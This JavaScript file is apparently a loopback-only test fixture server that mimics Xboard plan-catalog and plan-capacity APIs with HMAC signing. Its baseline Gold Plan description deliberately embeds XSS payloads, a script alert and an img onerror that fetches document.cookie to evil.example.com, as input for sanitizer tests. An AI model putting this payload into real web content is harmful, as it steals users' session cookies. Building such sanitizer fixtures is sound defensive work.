// @ts-check
/**
 * Xboard local catalog fixture server (narrow card PAR-CMI-001 fixture).
 *
 * Loopback-only fixture that mimics the Xboard (FakaBridge) provider
 * contracts — read-only `GET /plan-catalog` and `GET /plan-capacity` — so the
 * business catalog import / sanitizer E2E and MoNexus capacity precheck have
 * deterministic, secret-safe local sources. Built only on Node20 built-ins
 * (`node:http`, `node:crypto`, `node:url`). No new dependencies.
 *
 * Signing contract (mirrors server/src/lib/fakaBridge/sign.ts):
 *   `/plan-catalog`   HMAC-SHA256(secret, `paid_at=<value>`)
 *   `/plan-capacity`  HMAC-SHA256(secret, `paid_at=<unix>&sku=<sku>`)
 *                     (sku + paid_at canonicalized by key, lexicographic)
 * both → 64 lowercase hex `sign`.
 *
 * The module never auto-starts on import; it only starts when executed
 * directly as the main module (guarded via `import.meta.url`), and always
 * exports a `createFixtureServer()` factory that tests start/stop on dynamic
 * ports.
 */

import { createServer } from 'node:http'
import { createHmac, createHash, timingSafeEqual } from 'node:crypto'
import { pathToFileURL } from 'node:url'

/** @typedef {import('node:http').IncomingMessage} IncomingMessage */
/** @typedef {import('node:http').ServerResponse} ServerResponse */
/** @typedef {import('node:http').Server} HttpServer */

/** @typedef {{ period: string, price: number, sku_alias: string }} CatalogPeriod */
/** @typedef {{ sku: string, period: string }} NamedSku */
/**
 * @typedef {{
 *   plan_id: number,
 *   name: string,
 *   content: string | null,
 *   show: boolean,
 *   sell: boolean,
 *   renew: boolean,
 *   group_id: number | null,
 *   transfer_enable: number,
 *   capacity_limit: number | null,
 *   active_users: number,
 *   remaining: number | null,
 *   periods: CatalogPeriod[],
 *   named_skus: NamedSku[],
 * }} CatalogPlan
 */

export const DEFAULT_HOST = '127.0.0.1'
export const DEFAULT_PORT = 3106
export const DEFAULT_SECRET = 'test-only-secret'

/** Dedicated env override names (used only when CLI flags are absent). */
export const ENV_HOST = 'XBOARD_FIXTURE_HOST'
export const ENV_PORT = 'XBOARD_FIXTURE_PORT'
export const ENV_SECRET = 'XBOARD_FIXTURE_SECRET'

/** Hard cap for fixture JSON bodies (strict body size limit). */
export const MAX_FIXTURE_BODY_BYTES = 4096

/** Upper bound for a "reasonable" unix-seconds `paid_at` (2100-01-01T00:00:00Z). */
const MAX_UNIX_SECONDS = 4102444800

/** Upper bound for a "reasonable" `sku` length (covers gold/basic aliases). */
const MAX_SKU_LENGTH = 64
/** Allowed sku chars after normalization: lowercase alnum, `-`, `_`. */
const SKU_PATTERN = /^[a-z0-9][a-z0-9_-]*$/

const ERROR_CATALOG_UNAVAILABLE = 'fixture catalog unavailable'

/** Error carrying a ready-to-send JSON response (never leaks stack/secret). */
class HttpRespond extends Error {
  /**
   * @param {number} status
   * @param {Record<string, unknown>} body
   */
  constructor(status, body) {
    super(`http ${status}`)
    this.status = status
    this.body = body
  }
}

/** Build the baseline Xboard catalog (plan 77 = Gold Plan, hostile content). */
function buildBaselineCatalog() {
  /** @type {CatalogPlan[]} */
  return [
    {
      plan_id: 77,
      name: 'Gold Plan',
      content:
        'Gold Plan：每月 200GB 高速流量，适合主力使用，长期套餐更划算。欢迎购买！\n' +
        "<script>alert('gold-xss')</script>\n" +
        '<img src="https://evil.example.com/track.png" onerror="' +
        "fetch('https://evil.example.com/leak?c='+encodeURIComponent(document.cookie))\">",
      show: true,
      sell: true,
      renew: true,
      group_id: 1,
      transfer_enable: 214748364800, // 200 GB in bytes
      capacity_limit: 200,
      active_users: 12,
      remaining: 188,
      periods: [
        { period: 'monthly', price: 3000, sku_alias: 'gold-monthly' },
        { period: 'yearly', price: 30000, sku_alias: 'gold-yearly' },
      ],
      named_skus: [
        { sku: 'gold-monthly', period: 'monthly' },
        { sku: 'gold-yearly', period: 'yearly' },
      ],
    },
    {
      plan_id: 1,
      name: 'Basic Plan',
      content: 'Basic Plan：每月 20GB 流量，适合轻量使用。',
      show: true,
      sell: true,
      renew: true,
      group_id: null,
      transfer_enable: 21474836480, // 20 GB in bytes
      capacity_limit: null,
      active_users: 0,
      remaining: null,
      periods: [
        { period: 'monthly', price: 500, sku_alias: 'basic-monthly' },
        { period: 'yearly', price: 5000, sku_alias: 'basic-yearly' },
      ],
      named_skus: [
        { sku: 'basic-monthly', period: 'monthly' },
        { sku: 'basic-yearly', period: 'yearly' },
      ],
    },
  ]
}

/**
 * Deterministic source hash of a catalog (observability for the mutate/reset
 * fixture controls). 64 lowercase hex.
 * @param {CatalogPlan[]} catalog
 * @returns {string}
 */
function computeSourceHash(catalog) {
  return createHash('sha256').update(JSON.stringify(catalog), 'utf8').digest('hex')
}

/**
 * Mutable fixture state. Lives per-server-instance so tests get isolated state.
 * @returns {{
 *   getCatalog: () => CatalogPlan[],
 *   reset: () => string,
 *   mutate: () => string,
 *   failCatalog: (persistent: boolean) => void,
 *   consumeCatalogFail: () => boolean,
 * }}
 */
function createFixtureState() {
  let catalog = buildBaselineCatalog()
  /** @type {{ persistent: boolean } | null} */
  let catalogFail = null

  return {
    getCatalog() {
      return catalog
    },
    reset() {
      catalog = buildBaselineCatalog()
      catalogFail = null
      return computeSourceHash(catalog)
    },
    mutate() {
      catalog = catalog.map(plan => {
        if (plan.plan_id !== 77) return plan
        return {
          ...plan,
          name: 'Gold Plan (mutated)',
          content: `${plan.content}\n<!-- fixture mutate-source: name/content/period price flipped -->`,
          periods: plan.periods.map(p =>
            p.period === 'yearly'
              ? { ...p, price: 33000, sku_alias: 'gold-yearly-v2' }
              : p
          ),
          // Keep named_skus consistent with the flipped period alias so the
          // capacity lookup sees only the live sku (old gold-yearly → 404).
          named_skus: plan.named_skus.map(n =>
            n.period === 'yearly' ? { ...n, sku: 'gold-yearly-v2' } : n
          ),
        }
      })
      return computeSourceHash(catalog)
    },
    failCatalog(persistent) {
      catalogFail = { persistent }
    },
    consumeCatalogFail() {
      if (catalogFail === null) return false
      const shouldFail = true
      if (!catalogFail.persistent) catalogFail = null
      return shouldFail
    },
  }
}

/**
 * @param {string} host
 * @returns {boolean} true when host is a loopback address (127/8, ::1, localhost).
 */
export function isLoopbackHost(host) {
  if (host === 'localhost') return true
  if (host === '::1' || host === '[::1]') return true
  if (!/^127(?:\.\d{1,3}){3}$/.test(host)) return false
  return host.split('.').every(part => Number(part) <= 255)
}

/**
 * @param {unknown} value
 * @returns {value is string}
 */
function isNonEmptyString(value) {
  return typeof value === 'string' && value.length > 0
}

/**
 * Validate + normalize runtime options. `port === 0` is allowed only for the
 * test factory (dynamic port); CLI/env overrides enforce 1..65535 elsewhere.
 * @param {{ host?: unknown, port?: unknown, secret?: unknown }} options
 * @returns {{ host: string, port: number, secret: string }}
 */
function validateOptions(options) {
  const host = options.host === undefined ? DEFAULT_HOST : options.host
  if (!isNonEmptyString(host) || !isLoopbackHost(host)) {
    throw new Error(`invalid host ${JSON.stringify(host)}: must be a loopback address`)
  }
  const port = options.port === undefined ? DEFAULT_PORT : options.port
  if (typeof port !== 'number' || !Number.isInteger(port) || port < 0 || port > 65535) {
    throw new Error(`invalid port ${JSON.stringify(port)}: must be an integer in 0..65535`)
  }
  const secret = options.secret === undefined ? DEFAULT_SECRET : options.secret
  if (!isNonEmptyString(secret)) {
    throw new Error('secret must be a non-empty string')
  }
  return { host, port, secret }
}

/** @param {string} address */
function isLoopbackRemoteAddress(address) {
  if (address === '127.0.0.1' || address === '::1' || address === '::ffff:127.0.0.1') {
    return true
  }
  return /^::ffff:127\./.test(address) || /^127\./.test(address)
}

/**
 * @param {ServerResponse} res
 * @param {number} status
 * @param {Record<string, unknown>} body
 */
function sendJson(res, status, body) {
  const payload = JSON.stringify(body)
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
  })
  res.end(payload)
}

/** @param {ServerResponse} res @param {string} allow */
function methodNotAllowed(res, allow) {
  res.setHeader('Allow', allow)
  sendJson(res, 405, { success: false, error: 'method not allowed' })
}

/**
 * Read the request body with a hard size cap (never buffers more than the
 * fixture limit).
 * @param {IncomingMessage} req
 * @param {number} maxBytes
 * @returns {Promise<Buffer>}
 */
function readBody(req, maxBytes) {
  return new Promise((resolve, reject) => {
    /** @type {Buffer[]} */
    const chunks = []
    let total = 0
    let done = false
    const fail = (err) => {
      if (done) return
      done = true
      reject(err)
    }
    req.on('data', (chunk) => {
      if (done) return
      total += chunk.length
      if (total > maxBytes) {
        fail(new HttpRespond(413, { success: false, error: 'request body too large' }))
        return
      }
      chunks.push(/** @type {Buffer} */ (chunk))
    })
    req.on('end', () => {
      if (!done) resolve(Buffer.concat(chunks))
    })
    req.on('error', () => {
      fail(new HttpRespond(400, { success: false, error: 'invalid request body' }))
    })
  })
}

/**
 * Read + strictly parse a fixture JSON body. Empty body → `null`.
 * @param {IncomingMessage} req
 * @returns {Promise<unknown>}
 */
async function readJsonBodyOrEmpty(req) {
  const raw = await readBody(req, MAX_FIXTURE_BODY_BYTES)
  if (raw.length === 0) return null
  const contentType = String(req.headers['content-type'] ?? '')
  if (!contentType.split(';')[0].trim().toLowerCase().includes('application/json')) {
    throw new HttpRespond(400, {
      success: false,
      error: 'Content-Type must be application/json',
    })
  }
  let parsed
  try {
    parsed = JSON.parse(raw.toString('utf8'))
  } catch {
    throw new HttpRespond(400, { success: false, error: 'invalid JSON body' })
  }
  return parsed
}

/**
 * Strict allowlist for the `/__fixture/fail-catalog` body.
 * @param {unknown} parsed
 * @returns {{ persistent: boolean }}
 */
function parseFailCatalogBody(parsed) {
  if (parsed === null) return { persistent: false }
  if (typeof parsed !== 'object' || Array.isArray(parsed)) {
    throw new HttpRespond(400, { success: false, error: 'body must be a JSON object' })
  }
  for (const key of Object.keys(parsed)) {
    if (key !== 'persistent') {
      throw new HttpRespond(400, {
        success: false,
        error: `unexpected body key: ${key}`,
      })
    }
  }
  const entry = /** @type {{ persistent?: unknown }} */ (parsed)
  if ('persistent' in entry && typeof entry.persistent !== 'boolean') {
    throw new HttpRespond(400, { success: false, error: 'persistent must be a boolean' })
  }
  return { persistent: entry.persistent === true }
}

/** @param {unknown} value @returns {value is string} */
function isPlainDigits(value) {
  return typeof value === 'string' && /^\d+$/.test(value)
}

/**
 * Canonicalize a requested sku exactly like the production client
 * (server/src/lib/fakaBridge/client.ts): trim + lowercase.
 * @param {unknown} value
 * @returns {string}
 */
function normalizeSku(value) {
  return String(value).trim().toLowerCase()
}

/**
 * `sku` must be a non-empty, reasonably short lowercase alnum/`-`/`_` string
 * (compatible with gold-monthly / gold-yearly / basic-* aliases).
 * @param {unknown} value
 */
function isValidSku(value) {
  return (
    typeof value === 'string' &&
    value.length > 0 &&
    value.length <= MAX_SKU_LENGTH &&
    SKU_PATTERN.test(value)
  )
}

/**
 * `paid_at` must be a reasonable unix-seconds value (decimal digits, no sign,
 * bounded to [0, 2100-01-01]).
 * @param {unknown} value
 */
function isValidUnixSeconds(value) {
  if (!isPlainDigits(value) || value.length > 10) return false
  const n = Number(value)
  return Number.isSafeInteger(n) && n >= 0 && n <= MAX_UNIX_SECONDS
}

/** @param {unknown} value */
function isValidHexSign(value) {
  return typeof value === 'string' && /^[0-9a-f]{64}$/.test(value)
}

/**
 * Constant-time HMAC verification of `sign` against a canonical payload.
 * Mirrors server/src/lib/fakaBridge/sign.ts: strict 64-lowercase-hex sign,
 * HMAC-SHA256(secret, payload) compared with timingSafeEqual (never echoes
 * the secret or the sign).
 * @param {string} payload
 * @param {string} sign
 * @param {string} secret
 */
function hmacMatches(payload, sign, secret) {
  // Strict 64-lowercase-hex validation before decoding — never treat the sign
  // as a raw utf8 string here, or the decoded bytes won't match the 32-byte
  // digest and every valid signature would fail. Decode as hex so the byte
  // length matches the SHA-256 digest for the constant-time compare.
  if (!isValidHexSign(sign)) return false
  const expected = createHmac('sha256', secret)
    .update(payload, 'utf8')
    .digest()
  const provided = Buffer.from(sign, 'hex')
  return provided.length === expected.length && timingSafeEqual(provided, expected)
}

/** `/plan-catalog` payload is the literal string `paid_at=<value>`. */
function signatureValid(paidAt, sign, secret) {
  return hmacMatches(`paid_at=${paidAt}`, sign, secret)
}

/**
 * `/plan-capacity` payload is the lexicographic-canonical `paid_at=<unix>&sku=<sku>`
 * (sku is already normalized — matches how the production client signs).
 */
function capacitySignatureValid(sku, paidAt, sign, secret) {
  return hmacMatches(`paid_at=${paidAt}&sku=${sku}`, sign, secret)
}

/**
 * @param {string | undefined} accept
 * @returns {boolean} true when the client accepts JSON (or does not constrain it).
 */
function acceptsJson(accept) {
  if (accept === undefined || accept.trim() === '') return true
  return accept
    .split(',')
    .map(part => part.split(';')[0].trim().toLowerCase())
    .some(range => range === '*/*' || range === 'application/json' || range === 'application/*' || range.endsWith('+json'))
}

/**
 * Create a fixture server instance. Does NOT start listening — call `start()`.
 * @param {{ host?: string, port?: number, secret?: string } | undefined} [options]
 * @returns {Promise<{
 *   host: string,
 *   port: number,
 *   secret: string,
 *   server: HttpServer,
 *   start: () => Promise<number>,
 *   stop: () => Promise<void>,
 *   baseUrl: string | null,
 * }}> started fixture handle
 */
export async function createFixtureServer(options = {}) {
  const { host, port, secret } = validateOptions(options)
  const state = createFixtureState()

  /** @type {HttpServer} */
  const server = createServer((req, res) => {
    void handleRequest(server, state, host, secret, req, res)
  })
  server.on('clientError', (_err, socket) => {
    socket.end('HTTP/1.1 400 Bad Request\r\n\r\n')
  })

  let listeningPort = null

  /** @returns {Promise<number>} the actual listening port */
  function start() {
    if (listeningPort !== null) {
      return Promise.reject(new Error('fixture server already started'))
    }
    return new Promise((resolve, reject) => {
      const onError = (err) => {
        server.off('listening', onListening)
        reject(err instanceof Error ? err : new Error(String(err)))
      }
      const onListening = () => {
        server.off('error', onError)
        const addr = server.address()
        listeningPort = addr !== null && typeof addr === 'object' ? addr.port : null
        if (listeningPort === null) {
          reject(new Error('fixture server listening without an address'))
          return
        }
        resolve(listeningPort)
      }
      server.once('error', onError)
      server.once('listening', onListening)
      server.listen(port, host)
    })
  }

  /** @returns {Promise<void>} */
  function stop() {
    return new Promise((resolve, reject) => {
      if (!server.listening) {
        listeningPort = null
        resolve()
        return
      }
      let settled = false
      const finish = (fn) => {
        if (settled) return
        settled = true
        server.off('close', onClose)
        server.off('error', onError)
        fn()
      }
      const onClose = () => finish(resolve)
      const onError = (err) => finish(() => reject(err instanceof Error ? err : new Error(String(err))))
      server.once('close', onClose)
      server.once('error', onError)
      server.close()
      // Release idle keep-alive sockets so close() settles promptly.
      if (typeof server.closeAllConnections === 'function') server.closeAllConnections()
      listeningPort = null
    })
  }

  return {
    host,
    port,
    secret,
    server,
    start,
    stop,
    get baseUrl() {
      return listeningPort === null ? null : `http://${host}:${listeningPort}`
    },
  }
}

/**
 * Central request dispatcher.
 * @param {HttpServer} server
 * @param {ReturnType<typeof createFixtureState>} state
 * @param {string} host
 * @param {string} secret
 * @param {IncomingMessage} req
 * @param {ServerResponse} res
 */
async function handleRequest(server, state, host, secret, req, res) {
  try {
    res.on('error', () => {
      /* client aborted — nothing to do */
    })
    const method = (req.method ?? 'GET').toUpperCase()
    const url = new URL(req.url ?? '/', `http://${host}`)

    if (url.pathname === '/health') {
      if (method !== 'GET') return methodNotAllowed(res, 'GET')
      // Strictly no sensitive info: fixed ready body, no secret/host/port.
      return sendJson(res, 200, { success: true, status: 'ready', ready: true })
    }

    if (url.pathname === '/plan-catalog') {
      if (method !== 'GET') return methodNotAllowed(res, 'GET')
      return await handlePlanCatalog(state, secret, req, res, url)
    }

    if (url.pathname === '/plan-capacity') {
      if (method !== 'GET') return methodNotAllowed(res, 'GET')
      return await handlePlanCapacity(state, secret, req, res, url)
    }

    if (url.pathname.startsWith('/__fixture/')) {
      return await handleFixtureEndpoint(state, req, res, url)
    }

    return sendJson(res, 404, { success: false, error: 'not found' })
  } catch (err) {
    if (err instanceof HttpRespond) return sendJson(res, err.status, err.body)
    // Server-side diagnostic only; response never leaks stack/secret.
    console.error(`[xboard-fixture-server] unhandled error on ${req.method ?? '?'} ${req.url ?? '?'}`)
    console.error(err)
    return sendJson(res, 500, { success: false, error: 'internal server error' })
  }
}

/**
 * @param {ReturnType<typeof createFixtureState>} state
 * @param {string} secret
 * @param {IncomingMessage} req
 * @param {ServerResponse} res
 * @param {URL} url
 */
async function handlePlanCatalog(state, secret, req, res, url) {
  const seenKeys = new Set(url.searchParams.keys())
  for (const key of seenKeys) {
    if (key !== 'paid_at' && key !== 'sign') {
      throw new HttpRespond(400, { success: false, error: 'unexpected query parameter' })
    }
  }
  // Reject duplicate keys (query must contain each of paid_at/sign at most once).
  for (const key of ['paid_at', 'sign']) {
    if (url.searchParams.getAll(key).length > 1) {
      throw new HttpRespond(400, { success: false, error: `duplicate query parameter: ${key}` })
    }
  }

  const paidAt = url.searchParams.get('paid_at')
  if (!isValidUnixSeconds(paidAt)) {
    throw new HttpRespond(400, { success: false, error: 'invalid paid_at: expected unix seconds' })
  }
  const sign = url.searchParams.get('sign')
  if (!isValidHexSign(sign)) {
    throw new HttpRespond(400, { success: false, error: 'invalid sign: expected 64 lowercase hex chars' })
  }
  if (!signatureValid(paidAt, sign, secret)) {
    throw new HttpRespond(400, { success: false, error: 'invalid signature' })
  }
  if (!acceptsJson(req.headers.accept)) {
    throw new HttpRespond(400, { success: false, error: 'unsupported Accept: expected application/json' })
  }

  if (state.consumeCatalogFail()) {
    return sendJson(res, 503, { success: false, error: ERROR_CATALOG_UNAVAILABLE })
  }

  const plans = state.getCatalog()
  // External Xboard /plan-catalog contract: exactly { success: true, plans }.
  // sourceHash is fixture-internal observability exposed only on the __fixture
  // control endpoints (reset/mutate), never on the provider contract.
  return sendJson(res, 200, {
    success: true,
    plans,
  })
}

/**
 * Resolve a normalized sku to a plan + period from the *current* catalog.
 * `periods[].sku_alias` is the live sellable alias and takes precedence over
 * `named_skus[]` (which the mutate control keeps consistent). Returns null for
 * unknown skus — the caller turns that into a 404 (never leaks catalog
 * content).
 * @param {CatalogPlan[]} catalog
 * @param {string} sku
 * @returns {{ plan: CatalogPlan, period: string } | null}
 */
function lookupPlanCapacity(catalog, sku) {
  for (const plan of catalog) {
    const period = plan.periods.find(p => p.sku_alias === sku)
    if (period) return { plan, period: period.period }
  }
  for (const plan of catalog) {
    const named = plan.named_skus.find(n => n.sku === sku)
    if (named) return { plan, period: named.period }
  }
  return null
}

/**
 * Build the read-only capacity snapshot for a matched plan/period.
 * @param {{ plan: CatalogPlan, period: string }} hit
 * @param {string} sku normalized sku echoed back
 * @returns {Record<string, unknown>}
 */
function buildPlanCapacityResponse(hit, sku) {
  const { plan, period } = hit
  const sellable = plan.sell && plan.show && (plan.remaining === null || plan.remaining > 0)
  return {
    success: true,
    sku,
    plan_id: plan.plan_id,
    period,
    capacity_limit: plan.capacity_limit,
    active_users: plan.active_users,
    remaining: plan.remaining,
    sellable,
    show: plan.show,
    sell: plan.sell,
  }
}

/**
 * Read-only `GET /plan-capacity` — signed capacity precheck used by MoNexus
 * callFakaPlanCapacity. Strict query allowlist (sku, paid_at, sign), HMAC
 * verified against `paid_at=<unix>&sku=<sku>`, then resolves the sku against
 * the current catalog.
 * @param {ReturnType<typeof createFixtureState>} state
 * @param {string} secret
 * @param {IncomingMessage} req
 * @param {ServerResponse} res
 * @param {URL} url
 */
async function handlePlanCapacity(state, secret, req, res, url) {
  // Strict key allowlist — only sku/paid_at/sign, nothing else.
  for (const key of url.searchParams.keys()) {
    if (key !== 'sku' && key !== 'paid_at' && key !== 'sign') {
      throw new HttpRespond(400, { success: false, error: 'unexpected query parameter' })
    }
  }
  // Reject missing / duplicate keys.
  for (const key of ['sku', 'paid_at', 'sign']) {
    if (!url.searchParams.has(key)) {
      throw new HttpRespond(400, { success: false, error: `missing query parameter: ${key}` })
    }
    if (url.searchParams.getAll(key).length > 1) {
      throw new HttpRespond(400, { success: false, error: `duplicate query parameter: ${key}` })
    }
  }

  const sku = normalizeSku(url.searchParams.get('sku'))
  if (!isValidSku(sku)) {
    throw new HttpRespond(400, {
      success: false,
      error: 'invalid sku: expected non-empty lowercase alnum/-/_ up to 64 chars',
    })
  }
  const paidAt = url.searchParams.get('paid_at')
  if (!isValidUnixSeconds(paidAt)) {
    throw new HttpRespond(400, { success: false, error: 'invalid paid_at: expected unix seconds' })
  }
  const sign = url.searchParams.get('sign')
  if (!isValidHexSign(sign)) {
    throw new HttpRespond(400, { success: false, error: 'invalid sign: expected 64 lowercase hex chars' })
  }
  if (!capacitySignatureValid(sku, paidAt, sign, secret)) {
    throw new HttpRespond(400, { success: false, error: 'invalid signature' })
  }
  if (!acceptsJson(req.headers.accept)) {
    throw new HttpRespond(400, { success: false, error: 'unsupported Accept: expected application/json' })
  }

  if (state.consumeCatalogFail()) {
    return sendJson(res, 503, { success: false, error: ERROR_CATALOG_UNAVAILABLE })
  }

  const hit = lookupPlanCapacity(state.getCatalog(), sku)
  if (!hit) {
    // Unknown sku: generic 404, never echoes catalog content or the secret.
    return sendJson(res, 404, { success: false, error: 'sku not found' })
  }
  return sendJson(res, 200, buildPlanCapacityResponse(hit, sku))
}

/**
 * Fixture control endpoints — loopback-only, never carry/echo the secret.
 * @param {ReturnType<typeof createFixtureState>} state
 * @param {IncomingMessage} req
 * @param {ServerResponse} res
 * @param {URL} url
 */
async function handleFixtureEndpoint(state, req, res, url) {
  const remote = req.socket?.remoteAddress ?? ''
  if (!isLoopbackRemoteAddress(remote)) {
    return sendJson(res, 403, { success: false, error: 'fixture endpoints are loopback-only' })
  }
  if (req.method !== 'POST') return methodNotAllowed(res, 'POST')

  if (url.pathname === '/__fixture/reset') {
    const parsed = await readJsonBodyOrEmpty(req)
    if (parsed !== null && (!isPlainObject(parsed) || Object.keys(parsed).length !== 0)) {
      throw new HttpRespond(400, { success: false, error: 'reset accepts no body' })
    }
    const sourceHash = state.reset()
    return sendJson(res, 200, { success: true, action: 'reset', sourceHash })
  }

  if (url.pathname === '/__fixture/mutate-source') {
    const parsed = await readJsonBodyOrEmpty(req)
    if (parsed !== null && (!isPlainObject(parsed) || Object.keys(parsed).length !== 0)) {
      throw new HttpRespond(400, { success: false, error: 'mutate-source accepts no body' })
    }
    const sourceHash = state.mutate()
    return sendJson(res, 200, { success: true, action: 'mutate-source', sourceHash })
  }

  if (url.pathname === '/__fixture/fail-catalog') {
    const parsed = await readJsonBodyOrEmpty(req)
    const { persistent } = parseFailCatalogBody(parsed)
    state.failCatalog(persistent)
    return sendJson(res, 200, {
      success: true,
      action: 'fail-catalog',
      mode: persistent ? 'persistent' : 'once',
    })
  }

  return sendJson(res, 404, { success: false, error: 'not found' })
}

/** @param {unknown} value @returns {value is Record<string, unknown>} */
function isPlainObject(value) {
  return typeof value === 'object' && value !== null && !Array.isArray(value)
}

/** @returns {boolean} true when this module is the CLI entry point. */
function isMainModule() {
  const entry = process.argv[1]
  if (!entry) return false
  try {
    return import.meta.url === pathToFileURL(entry).href
  } catch {
    return false
  }
}

/** @param {string} text */
function printHelp() {
  console.log(
    [
      'Xboard local catalog fixture server',
      '',
      'Usage:',
      '  node scripts/cmi/xboard-fixture-server.mjs [options]',
      '',
      'Options:',
      '  --host <loopback>     listen host (default 127.0.0.1; must be loopback)',
      '  --port <1..65535>     listen port (default 3106)',
      '  --secret <string>     HMAC secret (default test-only-secret)',
      '  --help                show this help',
      '',
      'Env overrides (used when the matching CLI flag is absent):',
      `  ${ENV_HOST}, ${ENV_PORT}, ${ENV_SECRET}`,
    ].join('\n')
  )
}

/**
 * Strict CLI/env parsing. Overrides are validated: loopback host and port in
 * 1..65535 (port 0 / dynamic is reserved for the test factory).
 * @param {string[]} argv
 * @param {NodeJS.ProcessEnv} env
 * @returns {{ host: string, port: number, secret: string, help: boolean }}
 */
export function parseCliOptions(argv, env) {
  /** @type {Record<string, string | undefined>} */
  const flags = {}
  const positional = argv.slice(2)
  for (let i = 0; i < positional.length; i += 1) {
    const arg = positional[i]
    if (arg === '--help' || arg === '-h') {
      flags.help = 'true'
      continue
    }
    if (!arg.startsWith('--')) {
      throw new Error(`unexpected positional argument: ${arg}`)
    }
    const eq = arg.indexOf('=')
    const name = eq === -1 ? arg : arg.slice(0, eq)
    let value = eq === -1 ? positional[i + 1] : arg.slice(eq + 1)
    if (eq === -1) {
      if (value === undefined || value.startsWith('--')) {
        throw new Error(`missing value for ${name}`)
      }
      i += 1
    }
    if (flags[name] !== undefined) {
      throw new Error(`duplicate option: ${name}`)
    }
    flags[name] = value
  }

  const help = flags.help === 'true'

  const rawHost = flags['--host'] ?? env[ENV_HOST]
  const host = rawHost !== undefined && rawHost !== '' ? rawHost : DEFAULT_HOST
  if (!isLoopbackHost(host)) {
    throw new Error(`invalid host ${JSON.stringify(host)}: must be a loopback address`)
  }

  const rawPort = flags['--port'] ?? env[ENV_PORT]
  let port = DEFAULT_PORT
  if (rawPort !== undefined && rawPort !== '') {
    if (!/^[1-9]\d*$/.test(rawPort)) {
      throw new Error(`invalid port ${JSON.stringify(rawPort)}: expected 1..65535`)
    }
    port = Number(rawPort)
    if (!Number.isInteger(port) || port < 1 || port > 65535) {
      throw new Error(`invalid port ${JSON.stringify(rawPort)}: expected 1..65535`)
    }
  }

  const rawSecret = flags['--secret'] ?? env[ENV_SECRET]
  const secret = rawSecret !== undefined && rawSecret !== '' ? rawSecret : DEFAULT_SECRET

  return { host, port, secret, help }
}

async function runCli() {
  const { host, port, secret, help } = parseCliOptions(process.argv, process.env)
  if (help) {
    printHelp()
    return
  }
  const fixture = await createFixtureServer({ host, port, secret })
  await fixture.start()
  console.log(`[xboard-fixture-server] listening on http://${fixture.host}:${fixture.port} (secret: <redacted>)`)
  for (const signal of ['SIGINT', 'SIGTERM']) {
    process.on(signal, () => {
      console.log(`[xboard-fixture-server] ${signal} received, shutting down`)
      void fixture.stop().finally(() => process.exit(0))
    })
  }
}

if (isMainModule()) {
  runCli().catch((err) => {
    console.error(`[xboard-fixture-server] ${err instanceof Error ? err.message : String(err)}`)
    process.exitCode = 1
  })
}
